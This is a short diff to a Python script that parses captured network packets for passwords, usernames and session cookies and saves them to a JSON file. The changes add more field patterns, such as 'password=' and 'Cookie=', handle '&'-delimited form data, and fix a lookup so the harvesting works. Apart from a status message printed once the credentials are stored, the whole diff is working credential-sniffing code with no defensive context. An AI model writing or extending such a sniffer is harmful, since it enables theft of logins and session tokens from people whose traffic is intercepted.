@@ -3,9 +3,9 @@ import json
 
 
 user_credential_keys = {
-    "Password": ["pass: ", "password: ", "Password: "],
-    "UserName": ["username: ", "uname: ", "uid: ", "userid: ", "Username: "],
-    "Cookie": ["Cookies: ", "Cookie: "]
+    "Password": ["pass: ", "password: ", "Password: ", "pass= ", "password=", "Password= "],
+    "UserName": ["username: ", "userid: ", "Username: ", "username=", "userid=", "Username="],
+    "Cookie": ["Cookies: ", "Cookie: ", "Cookies= ", "Cookie= "]
 }
 
 
@@ -19,9 +19,9 @@ def get_credential(packet, credential_keys):
 
             ei = s.find("\r\n",si)
             if ei == -1:
-                continue
+                ei = s.find("&", si)
             
-            ss = s[si + len(keys): ei]         
+            ss = s[si + len(keys): ei]       
             return ss
         except:
             pass
@@ -32,10 +32,11 @@ def get_credential(packet, credential_keys):
 def get_all_user_credentials(packet, data):
     user_credentials = {}
     for credential in user_credential_keys:
-        user_credentials[credential] = get_credential(packet, credential)
+        user_credentials[credential] = get_credential(packet, user_credential_keys[credential])
 
-    with open("user_credentials.json", 'w') as json_file:
-        json.dump(user_credentials, json_file, indent=4)
-    
-    print("STORED ALL THE CREDENTIALS IN `user_credentials.json`")
-    exit(0)
+
+    if user_credentials["Password"] != None and user_credentials["UserName"] != None and user_credentials["Cookie"] != None:
+        with open("user_credentials.json", 'w') as json_file:
+            json.dump(user_credentials, json_file, indent=4)
+        print("STORED ALL THE CREDENTIALS IN `user_credentials.json`")
+        exit(0)
